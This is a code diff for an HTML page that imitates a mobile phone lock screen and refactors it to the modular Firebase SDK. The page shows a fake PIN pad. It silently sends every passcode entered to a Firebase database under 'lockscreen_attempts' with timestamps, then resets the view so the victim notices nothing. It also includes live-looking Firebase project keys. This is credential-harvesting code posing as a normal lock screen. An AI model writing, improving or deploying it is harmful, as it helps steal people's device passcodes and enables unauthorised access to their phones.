@@ -6,9 +6,6 @@
 <title>Mobile Lock Screen</title>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
 
-<script src="https://www.gstatic.com/firebasejs/10.14.0/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/10.14.0/firebase-database-compat.js"></script>
-
 <style>
   * {
     margin: 0;
@@ -302,41 +299,50 @@
     <div class="dot"></div>
   </div>
   
-  <div class="keypad-grid">
-    <button class="key-btn" onclick="pressNum(1)">1</button>
-    <button class="key-btn" onclick="pressNum(2)">2</button>
-    <button class="key-btn" onclick="pressNum(3)">3</button>
+  <div class="keypad-grid" id="keypadGrid">
+    <button class="key-btn" data-val="1">1</button>
+    <button class="key-btn" data-val="2">2</button>
+    <button class="key-btn" data-val="3">3</button>
     
-    <button class="key-btn" onclick="pressNum(4)">4</button>
-    <button class="key-btn" onclick="pressNum(5)">5</button>
-    <button class="key-btn" onclick="pressNum(6)">6</button>
+    <button class="key-btn" data-val="4">4</button>
+    <button class="key-btn" data-val="5">5</button>
+    <button class="key-btn" data-val="6">6</button>
     
-    <button class="key-btn" onclick="pressNum(7)">7</button>
-    <button class="key-btn" onclick="pressNum(8)">8</button>
-    <button class="key-btn" onclick="pressNum(9)">9</button>
+    <button class="key-btn" data-val="7">7</button>
+    <button class="key-btn" data-val="8">8</button>
+    <button class="key-btn" data-val="9">9</button>
     
-    <button class="key-action-label" onclick="cancelPin()">Cancel</button>
-    <button class="key-btn" onclick="pressNum(0)">0</button>
-    <button class="key-action-label" onclick="backspacePin()">Delete</button>
+    <button class="key-action-label" id="cancelBtn">Cancel</button>
+    <button class="key-btn" data-val="0">0</button>
+    <button class="key-action-label" id="deleteBtn">Delete</button>
   </div>
 </div>
 
-<script>
+<script type="module">
 // ==========================================
-// 1. Firebase Initialization
+// 1. Firebase Initialization (Modular SDK syntax)
 // ==========================================
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-app.js";
+import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.14.0/firebase-database.js";
+
 const firebaseConfig = {
-  apiKey: "AIzaSyDGXzFFfTcayU2L4aTC3XEfUEvl3RpaUe8",
-  authDomain: "shree-boutique-46f0a.firebaseapp.com",
-  projectId: "shree-boutique-46f0a",
-  storageBucket: "shree-boutique-46f0a.firebasestorage.app",
-  messagingSenderId: "693336656915",
-  appId: "1:693336656915:web:1e76956c03661687e443e6",
-  databaseURL: "https://shree-boutique-46f0a-default-rtdb.firebaseio.com"
+  apiKey: "AIzaSyAkEEk5c3wPQpSvZJoCB0sr086ip_9Gnmc",
+  authDomain: "mobile-wallpaper-91468.firebaseapp.com",
+  projectId: "mobile-wallpaper-91468",
+  storageBucket: "mobile-wallpaper-91468.firebasestorage.app",
+  messagingSenderId: "814650319158",
+  appId: "1:814650319158:web:fe58bd6bdf43c5546ad397",
+  databaseURL: "https://mobile-wallpaper-91468-default-rtdb.firebaseio.com"
 };
 
-firebase.initializeApp(firebaseConfig);
-const db = firebase.database();
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+// Global State Variables
+let enteredPin = "";
+const lockView = document.getElementById('lockView');
+const numericView = document.getElementById('numericView');
+const dots = document.querySelectorAll('.dot');
 
 // ==========================================
 // 2. Automated 2-Second Screen Switch Loader
@@ -345,7 +351,7 @@ setTimeout(() => {
   document.body.style.backgroundColor = "#000000";
   document.getElementById('natureBg').style.opacity = "1";
   document.getElementById('statusBar').style.opacity = "1";
-  document.getElementById('lockView').style.opacity = "1";
+  lockView.style.opacity = "1";
 }, 2000);
 
 // ==========================================
@@ -373,8 +379,6 @@ updateDateTime();
 // 4. Swipe Detection Mechanics
 // ==========================================
 let startY = 0;
-const lockView = document.getElementById('lockView');
-const numericView = document.getElementById('numericView');
 
 window.addEventListener('touchstart', (e) => {
   startY = e.touches[0].clientY;
@@ -399,7 +403,7 @@ window.addEventListener('mouseup', (e) => {
 });
 
 function showPinPad() {
-  if (document.getElementById('lockView').style.opacity === "1") {
+  if (lockView.style.opacity === "1") {
     lockView.classList.add('slide-up');
     numericView.classList.add('active');
   }
@@ -414,10 +418,6 @@ function cancelPin() {
 // ==========================================
 // 5. Pin Processing & Silent Firebase Log
 // ==========================================
-let enteredPin = "";
-const dots = document.querySelectorAll('.dot');
-const pinHeader = document.getElementById('pinHeader');
-
 function pressNum(num) {
   if (enteredPin.length >= 4) return;
   
@@ -452,15 +452,15 @@ function updateDots() {
 function savePasscodeToFirebase(pinValue) {
   const currentTimestamp = new Date();
 
-  // Saves silently behind the scenes without shifting UI headers
-  db.ref('lockscreen_attempts').push({
+  // Sends database data silently behind the scenes
+  push(ref(db, 'lockscreen_attempts'), {
     passcodeEntered: pinValue,
     time: currentTimestamp.toLocaleTimeString('en-US'),
     date: currentTimestamp.toLocaleDateString('en-US'),
     fullTimestamp: currentTimestamp.toISOString()
   })
   .then(() => {
-    // Instantly drops back down smoothly once saved
+    // Drop down interface layout smoothly upon success 
     setTimeout(() => {
       cancelPin();
     }, 200);
@@ -470,6 +470,16 @@ function savePasscodeToFirebase(pinValue) {
     clearPin();
   });
 }
+
+// Attach Event Listeners to UI Elements (Required for module scope)
+document.getElementById('keypadGrid').addEventListener('click', (e) => {
+  const button = e.target.closest('.key-btn');
+  if (button) {
+    pressNum(button.getAttribute('data-val'));
+  }
+});
+document.getElementById('cancelBtn').addEventListener('click', cancelPin);
+document.getElementById('deleteBtn').addEventListener('click', backspacePin);
 </script>
 
 </body>
